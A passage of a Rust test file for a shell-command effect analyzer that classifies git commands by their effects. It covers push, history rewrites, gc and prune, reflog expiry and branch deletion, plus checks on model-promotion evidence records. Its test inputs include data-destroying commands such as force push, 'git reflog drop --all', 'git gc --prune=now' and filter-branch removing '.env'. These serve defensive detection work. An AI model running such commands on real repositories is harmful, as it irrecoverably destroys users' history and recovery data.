        vec!["git", "push", "--dry-run", "origin", "main"],
        vec!["git", "push", "--dry-run", "--force", "origin", "main"],
        vec!["git", "push", "--dry-run", "--mirror", "origin"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(has_boundary(&plan, "unmodeled_hooks"), "{argv:?}");
        assert_eq!(
            attr(&plan, "git.remote_sync", "remote"),
            Some(AttrValue::String("origin".into()))
        );
        assert_eq!(
            attr(&plan, "git.remote_sync", "remote_complete"),
            Some(AttrValue::Bool(true))
        );
        assert_eq!(
            plan.coverage.level(&Domain::new("process")),
            Some(CoverageLevel::Partial)
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "git.push_request")
        );
    }
    for argv in [
        vec!["git", "push", "--dry-run", "origin", "main"],
        vec!["git", "push", "--help", "origin", "main"],
        vec!["git", "push", "--unknown", "origin", "main"],
        vec!["git", "push", "--force=maybe", "origin", "main"],
        vec!["git", "push", "--repo"],
        vec!["git", "push", "origin", "main..bad"],
        vec!["git", "push", "origin", "refs/heads/.hidden"],
        vec!["git", "push", "--delete", "--all", "origin"],
        vec!["git", "push", "--mirror", "origin", "main"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(
            !plan.effects.iter().any(|effect| {
                effect.operation.0 == "git.push_request"
                    && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
            }),
            "uncertified push request for {argv:?}"
        );
    }
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: r#"git push -- "$REMOTE" main"#.into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.push_request")
        .unwrap();
    assert_eq!(
        request.request_assurance,
        effinterp_proto::RequestAssurance::Exact
    );
    assert_eq!(
        request.attributes.get("controls_complete"),
        Some(&AttrValue::Bool(true))
    );
    assert_eq!(
        request.attributes.get("remote_complete"),
        Some(&AttrValue::Bool(false))
    );
    assert_eq!(
        request.attributes.get("destination_complete"),
        Some(&AttrValue::Bool(false))
    );
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: r#"git push --force "$REMOTE" main"#.into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.push_request")
        .unwrap();
    assert_eq!(
        request.request_assurance,
        effinterp_proto::RequestAssurance::Exact
    );
    assert_eq!(
        request.attributes.get("force"),
        Some(&AttrValue::Bool(true))
    );
    assert_eq!(
        request.attributes.get("controls_complete"),
        Some(&AttrValue::Bool(true))
    );
    assert_eq!(
        request.attributes.get("destination_complete"),
        Some(&AttrValue::Bool(false))
    );
}

#[test]
fn git_commit_keeps_unmodeled_hooks() {
    for argv in [
        ["git", "commit", "-m", "x"].as_slice(),
        ["git", "commit", "--no-verify", "-m", "x"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_boundary(&plan, "unmodeled_hooks"));
        assert_eq!(
            plan.coverage.level(&Domain::new("process")),
            Some(CoverageLevel::Partial)
        );
    }
    let plan = analyze(&["git", "commit", "--amend", "-m", "fix"], Some("/w"));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "git.history_rewrite_request")
    );
    for argv in [
        ["git", "commit", "--amend=false", "-m", "fix"].as_slice(),
        ["git", "commit", "--amend", "-m"].as_slice(),
        ["git", "rebase", "--force=false", "main"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            !plan.effects.iter().any(|effect| {
                effect.operation.0 == "git.history_rewrite_request"
                    && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
            }),
            "malformed amend control was certified: {argv:?}"
        );
    }
}

#[test]
fn git_rewrites_only_where_the_command_replays_commits() {
    // git-rebase(1)'s in-progress actions and git-filter-repo's reporting
    // modes leave history alone; claiming a rewrite for them is a false
    // destructive effect.
    for argv in [
        ["git", "rebase", "--quit"].as_slice(),
        ["git", "rebase", "--edit-todo"].as_slice(),
        ["git", "rebase", "--show-current-patch"].as_slice(),
        ["git", "filter-repo", "--analyze"].as_slice(),
        ["git", "filter-repo", "--dry-run", "--force"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "git.read", "/w"), "{argv:?}");
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0.starts_with("git.history_rewrite")),
            "{argv:?}"
        );
        assert!(plan.boundaries.is_empty(), "{argv:?}");
    }
    for argv in [
        ["git", "filter-repo", "--version"].as_slice(),
        ["git", "filter-repo", "--force", "--help"].as_slice(),
        ["git", "rebase", "--help"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(command_effects(&plan).is_empty(), "{argv:?}");
        assert!(plan.boundaries.is_empty(), "{argv:?}");
    }
    // Restoring the pre-rebase state moves the branch and worktree back, and
    // git still runs hooks while doing it.
    let plan = analyze(&["git", "rebase", "--abort"], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_write", "/w"));
    assert!(has_effect(&plan, "git.ref_update", "/w"));
    assert!(has_boundary(&plan, "unmodeled_hooks"));
    // Replaying commits still rewrites.
    for argv in [
        ["git", "rebase", "--continue"].as_slice(),
        ["git", "rebase", "main"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "git.history_rewrite", "/w"), "{argv:?}");
    }
    // Regression: a documented filter option left the forced rewrite
    // unproven, so git-rewrite-force went silent on the realistic
    // filter-branch and filter-repo forms. Filter code stays a boundary, and
    // a filter-option value is never read as a revision.
    for argv in [
        [
            "git",
            "filter-branch",
            "-f",
            "--tree-filter",
            "rm -f .env",
            "HEAD",
        ]
        .as_slice(),
        [
            "git",
            "filter-branch",
            "--force",
            "--index-filter",
            "git rm --cached x",
            "--",
            "--all",
        ]
        .as_slice(),
        [
            "git",
            "filter-branch",
            "-f",
            "--subdirectory-filter",
            "lib",
            "--",
            "--all",
        ]
        .as_slice(),
        ["git", "filter-repo", "--mailmap", ".mailmap", "--force"].as_slice(),
        [
            "git",
            "filter-repo",
            "--force",
            "--strip-blobs-bigger-than",
            "10M",
        ]
        .as_slice(),
        [
            "git",
            "filter-repo",
            "--force",
            "--path-rename",
            "old/:new/",
        ]
        .as_slice(),
        ["git-filter-repo", "--force", "--path", "src/"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        let request = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.history_rewrite_request")
            .unwrap_or_else(|| panic!("{argv:?}"));
        assert_eq!(
            request.attributes.get("force"),
            Some(&AttrValue::Bool(true)),
            "{argv:?}"
        );
        assert_eq!(
            request.attributes.get("target_complete"),
            Some(&AttrValue::Bool(true)),
            "{argv:?}"
        );
        assert_eq!(
            has_boundary(&plan, "unmodeled_inline_code"),
            argv.iter()
                .any(|word| word.ends_with("-filter") && *word != "--subdirectory-filter"),
            "{argv:?}"
        );
    }
    assert!(has_effect(
        &analyze(
            &["git", "filter-repo", "--force", "--mailmap", "names"],
            Some("/w")
        ),
        "filesystem.read",
        "/w/names"
    ));
    // filter-branch reads options by exact spelling and exits with usage on
    // anything else, before it rewrites.
    for argv in [
        ["git", "filter-branch", "--tree-filter=true", "HEAD"].as_slice(),
        ["git", "filter-branch", "--tree", "true", "HEAD"].as_slice(),
        // Regression: the scratch directory was planned as deleted before the
        // usage check, so an unsupported option still claimed `rm -rf` of it.
        ["git", "filter-branch", "-d", "/w", "--dry-run"].as_slice(),
        [
            "git",
            "filter-branch",
            "-f",
            "-d",
            "/w",
            "--no-force",
            "HEAD",
        ]
        .as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(command_effects(&plan).is_empty(), "{argv:?}");
    }
    // Only `--force` removes an existing scratch directory, and only the last
    // `-d` names it; without force an existing one stops the rewrite.
    for (argv, deleted) in [
        (
            ["git", "filter-branch", "-d", "/w", "HEAD"].as_slice(),
            None,
        ),
        (
            [
                "git",
                "filter-branch",
                "-f",
                "-d",
                "/w",
                "-d",
                "scratch",
                "HEAD",
            ]
            .as_slice(),
            Some("/w/scratch"),
        ),
    ] {
        let plan = analyze(argv, Some("/w"));
        let deletes: Vec<_> = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.delete")
            .map(|effect| display_resource(&effect.resource))
            .collect();
        assert_eq!(
            deletes,
            deleted
                .map(|path| format!("fs:{path}"))
                .into_iter()
                .collect::<Vec<_>>(),
            "{argv:?}"
        );
    }
}

#[test]
fn git_filter_repo_value_options_do_not_rewrite_on_missing_arguments() {
    for argv in [
        vec!["git", "filter-repo", "--force", "--replace-text", "--help"],
        vec!["git", "filter-repo", "--force", "--replace-text"],
        vec!["git", "filter-repo", "--replace-text", "-f"],
        vec!["git", "filter-repo", "--path", "--force"],
        vec!["git", "filter-repo", "--path"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(command_effects(&plan).is_empty(), "{argv:?}");
        assert!(plan.boundaries.is_empty(), "{argv:?}");
        assert_eq!(
            plan.coverage.level(&Domain::new("git")),
            Some(CoverageLevel::Full)
        );
    }
    for (args, path) in [
        (vec!["--replace-text", "expressions"], "/w/expressions"),
        (vec!["--replace-text=--help"], "/w/--help"),
        (vec!["--replace-text", "-.5"], "/w/-.5"),
        (vec!["--replace-text", "-file name"], "/w/-file name"),
    ] {
        let mut argv = vec!["git", "filter-repo", "--force"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/w"));
        assert!(has_effect(&plan, "filesystem.read", path), "{argv:?}");
        assert!(
            has_effect(&plan, "git.history_rewrite_request", "/w"),
            "{argv:?}"
        );
    }
}

#[test]
fn git_pathless_command_with_relative_ambient_cwd_stays_symbolic() {
    // A relative cwd is discovery's script-directory assumption, not a path
    // the command names: `git push` in script/release must not fabricate a
    // repo resource at <cwd>/script.
    let plan = analyze(&["git", "push"], Some("script"));
    let push = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "git.remote_sync")
        .expect("push emits remote_sync");
    assert!(
        matches!(&push.resource, ResourceExpr::Concrete {
            identity: ResourceIdentity::GitRepository {
                worktree: Some(worktree),
                git_dir: None,
                pathspec: None,
            }
        } if matches!(worktree.as_ref(), ResourceExpr::Parameter { name } if name == "cwd")),
        "got {:?}",
        push.resource
    );
}

#[test]
fn git_repository_identity_keeps_worktree_git_dir_and_pathspec_distinct() {
    let plan = analyze(
        &[
            "git",
            "-C",
            "/repo",
            "--work-tree",
            "work",
            "--git-dir",
            "metadata",
            "restore",
            "src/lib.rs",
        ],
        Some("/w"),
    );
    let effect = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.worktree_discard")
        .unwrap();
    assert!(matches!(&effect.resource, ResourceExpr::Concrete {
        identity: ResourceIdentity::GitRepository {
            worktree: Some(worktree),
            git_dir: Some(git_dir),
            pathspec: Some(pathspec),
        }
    } if matches!(worktree.as_ref(), ResourceExpr::Concrete {
        identity: ResourceIdentity::FsPath { path }
    } if path == "/repo/work")
        && matches!(git_dir.as_ref(), ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        } if path == "/repo/metadata")
        && matches!(pathspec.as_ref(), ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        } if path == "src/lib.rs")));
}

#[test]
fn git_symbolic_dash_c_remains_nested_in_the_repository_identity() {
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: "git -C \"$DIR\" status".into(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "git.read"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::GitRepository {
                    worktree: Some(worktree),
                    git_dir: None,
                    pathspec: None,
                }
            } if matches!(worktree.as_ref(), ResourceExpr::Environment { name } if name == "DIR"))
    }));
}

#[test]
fn git_clone_writes_dest_and_downloads() {
    let plan = analyze(&["git", "clone", "https://x.com/r.git"], Some("/w"));
    assert!(has_effect(
        &plan,
        "network.download",
        "net:https://x.com/r.git"
    ));
    assert!(has_effect(&plan, "filesystem.write", "/w/r"));

    let plan = analyze(
        &["git", "clone", "https://x.com/r.git", "custom"],
        Some("/w"),
    );
    assert!(has_effect(&plan, "filesystem.write", "/w/custom"));
}

#[test]
fn git_gc_prune_semantics() {
    for flag in ["-h", "--help"] {
        let plan = analyze(&["git", "gc", flag], Some("/w"));
        assert!(
            !plan.effects.iter().any(|effect| matches!(
                effect.operation.0.as_str(),
                "git.read" | "git.recovery_destroy" | "git.recovery_destroy_request"
            )),
            "{flag}: {:?}",
            plan.effects
        );
    }

    let plan = analyze(&["git", "gc"], Some("/w"));
    assert_eq!(attr(&plan, "git.recovery_destroy", "immediate"), None);
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "git.recovery_destroy_request")
    );
    assert_eq!(
        attr(&plan, "git.recovery_destroy_request", "scope"),
        Some(AttrValue::String("named".into()))
    );

    let plan = analyze(&["git", "-c", "gc.pruneExpire=now", "gc"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.recovery_destroy", "immediate"),
        Some(AttrValue::Bool(true))
    );

    // What the collection destroys: the expiry selector and the repack
    // effort, so routine gc stays separable from a history-affecting one.
    let plan = analyze(&["git", "gc", "--aggressive"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.recovery_destroy_request", "aggressive"),
        Some(AttrValue::Bool(true))
    );
    let plan = analyze(&["git", "gc", "--prune=2.weeks.ago"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.recovery_destroy_request", "prune"),
        Some(AttrValue::String("2.weeks.ago".into()))
    );
    assert_eq!(
        attr(&plan, "git.recovery_destroy_request", "immediate"),
        Some(AttrValue::Bool(false))
    );
    for value in ["now", "all", "0"] {
        let plan = analyze(&["git", "gc", &format!("--prune={value}")], Some("/w"));
        assert_eq!(
            attr(&plan, "git.recovery_destroy_request", "immediate"),
            Some(AttrValue::Bool(true)),
            "--prune={value}"
        );
        assert_eq!(
            attr(&plan, "git.recovery_destroy_request", "scope"),
            Some(AttrValue::String("whole".into())),
            "--prune={value}"
        );
    }

    let plan = analyze(&["git", "prune", "--dry-run"], Some("/w"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "git.recovery_destroy_request")
    );
    let plan = analyze(&["git", "prune"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.recovery_destroy_request", "immediate"),
        Some(AttrValue::Bool(true))
    );
    assert_eq!(
        attr(&plan, "git.recovery_destroy_request", "scope"),
        Some(AttrValue::String("whole".into()))
    );
    for argv in [
        ["git", "prune", "--expire=now"].as_slice(),
        ["git", "prune", "--expire", "now"].as_slice(),
    ] {
        assert_eq!(
            attr(
                &analyze(argv, Some("/w")),
                "git.recovery_destroy_request",
                "immediate"
            ),
            Some(AttrValue::Bool(true)),
            "{argv:?}"
        );
    }
    let invalid = analyze(&["git", "gc", "junk"], Some("/w"));
    assert!(
        !invalid
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "git.recovery_destroy_request")
    );

    for flag in ["--dry-run", "-n"] {
        for (refs, scope) in [
            (vec!["--all"], "whole"),
            (vec!["HEAD"], "named"),
            (vec!["HEAD", "refs/heads/topic"], "named"),
        ] {
            let mut argv = vec!["git", "reflog", "expire", flag, "--expire=now"];
            argv.extend(refs);
            let plan = analyze(&argv, Some("/w"));
            for (key, value) in [
                ("action", AttrValue::String("expire".into())),
                ("scope", AttrValue::String(scope.into())),
                ("dry_run", AttrValue::Bool(true)),
            ] {
                assert_eq!(
                    attr(&plan, "git.recovery_destroy", key),
                    Some(value),
                    "{argv:?}"
                );
            }
            assert!(
                !plan
                    .effects
                    .iter()
                    .any(|effect| effect.operation.0 == "git.recovery_destroy_request")
            );
        }
    }
    let plan = analyze(&["git", "reflog", "expire", "--all"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.recovery_destroy", "scope"),
        Some(AttrValue::String("whole".into()))
    );
    assert_eq!(
        attr(&plan, "git.recovery_destroy", "dry_run"),
        Some(AttrValue::Bool(false))
    );
    let plan = analyze(
        &["git", "reflog", "expire", "--unknown", "HEAD"],
        Some("/w"),
    );
    assert_eq!(attr(&plan, "git.recovery_destroy", "scope"), None);
    let symbolic = Engine::new()
        .analyze(&Subject::Shell {
            source: "git reflog expire --expire=now \"$REF\"".into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    let request = symbolic
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.recovery_destroy_request")
        .expect("reflog recovery request");
    assert_eq!(
        request.attributes.get("target_complete"),
        Some(&AttrValue::Bool(false))
    );
    assert_eq!(
        request.attributes.get("scope"),
        Some(&AttrValue::String("named".into()))
    );
    let no_all = analyze(&["git", "reflog", "expire", "--expire=now"], Some("/w"));
    assert_eq!(
        attr(&no_all, "git.recovery_destroy_request", "scope"),
        Some(AttrValue::String("named".into()))
    );
}

#[test]
fn git_worktree_prune_detached_expire_value() {
    for argv in [
        ["git", "worktree", "prune", "--expire", "now"].as_slice(),
        ["git", "worktree", "prune", "--expire=now"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.worktree_discard_request", "discard_mode"),
            Some(AttrValue::String("worktree_prune".into())),
            "{argv:?}"
        );
    }
    let plan = analyze(
        &["git", "worktree", "prune", "--expire", "now", "extra"],
        Some("/w"),
    );
    assert_eq!(
        attr(&plan, "git.worktree_discard_request", "discard_mode"),
        None
    );
}

#[test]
fn git_gc_no_prune_still_expires_reflogs() {
    for (argv, aggressive) in [
        (["git", "gc", "--no-prune"].as_slice(), false),
        (["git", "gc", "--no-prune", "--aggressive"].as_slice(), true),
        (["git", "gc", "--prune=now", "--no-prune"].as_slice(), false),
        (
            ["git", "-c", "gc.pruneExpire=now", "gc", "--no-prune"].as_slice(),
            false,
        ),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "git.recovery_destroy", "/w"), "{argv:?}");
        assert!(!has_effect(&plan, "git.read", "/w"), "{argv:?}");
        for (key, value) in [
            ("immediate", Some(AttrValue::Bool(false))),
            ("aggressive", Some(AttrValue::Bool(aggressive))),
            ("scope", Some(AttrValue::String("named".into()))),
            ("prune", None),
        ] {
            assert_eq!(
                attr(&plan, "git.recovery_destroy_request", key),
                value,
                "{argv:?} {key}"
            );
        }
    }
    let plan = analyze(&["git", "gc", "--no-prune", "--prune=now"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.recovery_destroy_request", "immediate"),
        Some(AttrValue::Bool(true))
    );
}

#[test]
fn git_expiry_selector_last_value_wins_in_any_case() {
    for (argv, immediate) in [
        (
            ["git", "gc", "--prune=now", "--prune=never"].as_slice(),
            false,
        ),
        (
            ["git", "gc", "--prune=never", "--prune=now"].as_slice(),
            true,
        ),
        (["git", "-c", "gc.pruneExpire=NOW", "gc"].as_slice(), true),
        (["git", "prune", "--expire=NOW"].as_slice(), true),
        (
            [
                "git",
                "reflog",
                "expire",
                "--all",
                "--expire=now",
                "--expire=never",
            ]
            .as_slice(),
            false,
        ),
        (
            [
                "git",
                "reflog",
                "expire",
                "--all",
                "--expire=never",
                "--expire=now",
            ]
            .as_slice(),
            true,
        ),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.recovery_destroy_request", "immediate"),
            Some(AttrValue::Bool(immediate)),
            "{argv:?}"
        );
        assert_eq!(
            attr(&plan, "git.recovery_destroy_request", "scope"),
            Some(AttrValue::String(
                if immediate { "whole" } else { "named" }.into()
            )),
            "{argv:?}"
        );
    }
}

#[test]
fn git_reflog_expire_all_ignores_named_refs() {
    // git expires every reflog `--all` selects before it reports an empty
    // ref as pointing nowhere.
    for named in ["HEAD", ""] {
        let plan = analyze(
            &["git", "reflog", "expire", "--all", "--expire=now", named],
            Some("/w"),
        );
        assert_eq!(
            attr(&plan, "git.recovery_destroy_request", "scope"),
            Some(AttrValue::String("whole".into()))
        );
        assert_eq!(
            attr(&plan, "git.recovery_destroy_request", "broad"),
            Some(AttrValue::Bool(true))
        );
    }
    // The action is only the word right after `reflog`; otherwise git
    // shows the reflog of the words it was given.
    let plan = analyze(
        &["git", "reflog", "--all", "expire", "--expire=now"],
        Some("/w"),
    );
    assert!(has_effect(&plan, "git.read", "/w"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| { effect.operation.0.starts_with("git.recovery_destroy") })
    );
    // `drop` (git 2.50) and `write` (git 2.52) change reflogs; they keep
    // the recovery evidence and never read as `reflog show`.
    for action in ["drop", "write"] {
        let plan = analyze(&["git", "reflog", action, "--all"], Some("/w"));
        assert!(
            attr(&plan, "git.recovery_destroy", "reflog").is_some(),
            "{action}"
        );
        assert!(!has_effect(&plan, "git.read", "/w"), "{action}");
    }
    // `drop --all` deletes every reflog outright, whatever its entries' age.
    let plan = analyze(&["git", "reflog", "drop", "--all"], Some("/w"));
    for (key, value) in [
        ("scope", AttrValue::String("whole".into())),
        ("broad", AttrValue::Bool(true)),
    ] {
        assert_eq!(
            attr(&plan, "git.recovery_destroy_request", key),
            Some(value)
        );
    }
    // `-C ''` stays in the cwd, and gc reads only its last `--prune`.
    for argv in [
        ["git", "-C", "", "gc", "--prune=now"].as_slice(),
        ["git", "gc", "--prune=", "--prune=now"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.recovery_destroy_request", "scope"),
            Some(AttrValue::String("whole".into())),
            "{argv:?}"
        );
    }
    let plan = analyze(&["git", "gc", "--prune=now", "--prune="], Some("/w"));
    assert!(command_effects(&plan).is_empty());
}

#[test]
fn git_branch_delete() {
    let plan = analyze(&["git", "branch", "-D", "old"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.ref_update", "delete"),
        Some(AttrValue::Bool(true))
    );
    assert_eq!(
        attr(&plan, "git.ref_update", "force"),
        Some(AttrValue::Bool(true))
    );

    let plan = analyze(&["git", "branch"], Some("/w"));
    assert!(has_effect(&plan, "git.read", "/w"));
}

#[test]
fn git_branch_delete_in_a_short_option_cluster() {
    let plan = analyze(&["git", "branch", "-vrd", "one", "two"], Some("/w"));
    let deleted = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "git.ref_delete_request")
        .map(|effect| effect.attributes.get("ref").cloned())
        .collect::<Vec<_>>();
    assert_eq!(
        deleted,
        [
            Some(AttrValue::String("one".into())),
            Some(AttrValue::String("two".into()))
        ]
    );
    assert_eq!(
        attr(&plan, "git.ref_delete_request", "force"),
        Some(AttrValue::Bool(false))
    );
    let plan = analyze(&["git", "branch", "-vD", "one"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.ref_delete_request", "force"),
        Some(AttrValue::Bool(true))
    );
}

#[test]
fn git_unknown_subcommand_is_a_boundary() {
    let plan = analyze(&["git", "frobnicate"], Some("/w"));
    assert!(has_boundary(&plan, "unmodeled_subcommand"));
}

#[test]
fn git_rm_deletes_unless_cached() {
    let plan = analyze(&["git", "rm", "-r", "dir"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.delete", "/w/dir"));

    let plan = analyze(&["git", "rm", "--cached", "f"], Some("/w"));
    assert!(!ops(&plan).iter().any(|(o, _)| *o == "filesystem.delete"));
}

// P11 model-source evidence. The P18b tranche was selected from boundary
// facts observed in the historical `p11b_v1` evaluation run. That provenance
// is recorded as structured observations pinned to the run's semantic
// identity, never as a path-and-line citation into a regenerated report.

fn repository_root() -> std::path::PathBuf {
    std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../..")
}

fn read_json(relative: &str) -> serde_json::Value {
    let path = repository_root().join(relative);
    let source = std::fs::read_to_string(&path)
        .unwrap_or_else(|error| panic!("{}: {error}", path.display()));
    serde_json::from_str(&source).unwrap_or_else(|error| panic!("{}: {error}", path.display()))
}

fn promoted_model_paths() -> Vec<std::path::PathBuf> {
    fn collect(directory: &std::path::Path, paths: &mut Vec<std::path::PathBuf>) {
        for entry in std::fs::read_dir(directory).unwrap() {
            let path = entry.unwrap().path();
            if path.is_dir() {
                collect(&path, paths);
            } else if path.extension().and_then(|extension| extension.to_str()) == Some("json") {
                paths.push(path);
            }
        }
    }

    let mut paths = Vec::new();
    collect(
        &repository_root().join("crates/effinterp-engine/models/v1"),
        &mut paths,
    );
    paths.sort();
    paths
}

const P11_SOURCE_RECORDS: [&str; 2] = [
    "crates/effinterp-engine/tests/fixtures/model_tranche/tranche_sources.json",
    "crates/effinterp-engine/tests/fixtures/model_tranche/install_source.json",
];

/// The historical run reports these fixtures were copied from; `p11_run.report`
/// in the source records still names the original `stress_test_runs/` path.
const PROMOTION_EVIDENCE_DIR: &str = "crates/effinterp-engine/tests/fixtures/promotion_evidence";
const P18B_EVIDENCE: &str =
    "crates/effinterp-engine/tests/fixtures/promotion_evidence/P18B_MODEL_PROMOTION_EVIDENCE.json";

/// `p18b/<family>/<command>@v1` names exactly one executable.
fn declared_command(id: &str) -> &str {
    id.rsplit('/').next().unwrap().split('@').next().unwrap()
}

fn observations(record: &serde_json::Value) -> &Vec<serde_json::Value> {
    record["p11_observations"].as_array().unwrap()
}

fn observation_ids(entry: &serde_json::Value) -> Vec<&str> {
    entry["p11_observations"]
        .as_array()
        .unwrap()
        .iter()
        .map(|value| match value {
            serde_json::Value::String(id) => id.as_str(),
            observation => observation["id"].as_str().unwrap(),
        })
        .collect()
}

#[test]
fn p11_source_evidence_pins_the_historical_run_by_semantic_identity() {
    let run = read_json(&format!("{PROMOTION_EVIDENCE_DIR}/RUN_p11b_v1.json"));
    for record in P11_SOURCE_RECORDS {
        let pin = &read_json(record)["p11_run"];
        assert_eq!(pin["label"], run["label"], "{record}");
        assert_eq!(pin["kind"], run["kind"], "{record}");
        assert_eq!(pin["output_schema"], run["schema"], "{record}");
        assert_eq!(pin["evaluation_class"], run["evaluation_class"], "{record}");
        assert_eq!(
            pin["semantic_identity"], run["semantic_identity_hash"],
            "{record}"
        );
        assert_eq!(
            pin["report"], "stress_test_runs/RUN_p11b_v1.json",
            "{record}"
        );
    }
}

#[test]
fn p11_observations_are_unique_and_agree_with_the_pinned_run() {
    let run = read_json(&format!("{PROMOTION_EVIDENCE_DIR}/RUN_p11b_v1.json"));
    let label = run["label"].as_str().unwrap();
    let mut seen = BTreeSet::new();
    for observation in observations(&read_json(P11_SOURCE_RECORDS[0])) {
        let repo = observation["repo"].as_str().unwrap();
        let scope = observation["entrypoint_scope"].as_str().unwrap();
        let reason = observation["boundary_reason"].as_str().unwrap();
        let command = observation["command"].as_str().unwrap();
        let id = observation["id"].as_str().unwrap();
        assert_eq!(reason, "unmodeled_command", "{id}");
        assert_eq!(id, format!("{label}:{repo}:{scope}:{reason}:{command}"));
        assert!(seen.insert(id.to_string()), "duplicate observation {id}");
        assert!(
            ["all-entrypoints", "real-entrypoint"].contains(&scope),
            "{id}"
        );
        assert!(observation["occurrences"].as_u64().unwrap() > 0, "{id}");
        assert_eq!(
            observation["repo_sha"], run["repos"][repo]["sha"],
            "{id} is not pinned to the run's analyzed revision"
        );
    }
    assert_eq!(seen.len(), 16);
}

#[test]
fn direct_p11_selections_reference_declared_observations() {
    let record = read_json(P11_SOURCE_RECORDS[0]);
    let declared = observations(&record)
        .iter()
        .filter(|observation| observation["command"] != "date")
        .map(|observation| {
            (
                observation["id"].as_str().unwrap().to_string(),
                observation["command"].as_str().unwrap().to_string(),
            )
        })
        .collect::<std::collections::BTreeMap<_, _>>();

    let mut referenced = BTreeSet::new();
    for model in record["models"].as_array().unwrap() {
        let id = model["id"].as_str().unwrap();
        let referenced_here = observation_ids(model);
        if model["selection"] != "p11-unmodeled-command-miss" {
            assert!(referenced_here.is_empty(), "{id} is not a direct P11 miss");
            continue;
        }
        assert_eq!(referenced_here.len(), 1, "{id}");
        let observation = referenced_here[0];
        let command = declared
            .get(observation)
            .unwrap_or_else(|| panic!("{id} references undeclared observation {observation}"));
        assert_eq!(command.as_str(), declared_command(id), "{id}");
        assert_eq!(command.as_str(), model["name"].as_str().unwrap(), "{id}");
        assert!(referenced.insert(observation.to_string()), "{observation}");
    }
    assert_eq!(
        referenced,
        declared.keys().cloned().collect::<BTreeSet<_>>(),
        "every converted observation owns exactly one direct P11 selection"
    );
}

#[test]
fn the_standalone_install_record_reuses_the_tranche_observation() {
    let tranche = read_json(P11_SOURCE_RECORDS[0]);
    let install = read_json(P11_SOURCE_RECORDS[1]);
    let inline = observations(&install);
    assert_eq!(inline.len(), 1);
    assert_eq!(
        inline[0]["command"].as_str().unwrap(),
        declared_command(install["id"].as_str().unwrap())
    );
    let shared = observations(&tranche)
        .iter()
        .find(|observation| observation["id"] == inline[0]["id"])
        .expect("install observation is absent from the tranche record");
    assert_eq!(shared, &inline[0]);
}

#[test]
fn p18b_promotion_evidence_references_declared_observations() {
    let record = read_json(P11_SOURCE_RECORDS[0]);
    let declared = observations(&record)
        .iter()
        .filter(|observation| observation["command"] != "date")
        .map(|observation| observation["id"].as_str().unwrap().to_string())
        .collect::<BTreeSet<_>>();
    let evidence = read_json(P18B_EVIDENCE);
    assert_eq!(evidence["selection"]["p11_runs"][0], record["p11_run"]);

    let mut direct = 0;
    for revision in evidence["model_revisions"].as_array().unwrap() {
        let id = revision["id"].as_str().unwrap();
        let referenced = observation_ids(revision);
        if revision["selection_basis"] != "p11-unmodeled-command-miss" {
            assert!(referenced.is_empty(), "{id}");
            continue;
        }
        direct += 1;
        assert_eq!(referenced.len(), 1, "{id}");
        assert!(declared.contains(referenced[0]), "{id}");
        assert!(
            referenced[0].ends_with(&format!(":unmodeled_command:{}", declared_command(id))),
            "{id} references observation {}",
            referenced[0]
        );
    }
    assert_eq!(direct, declared.len());
}

#[test]
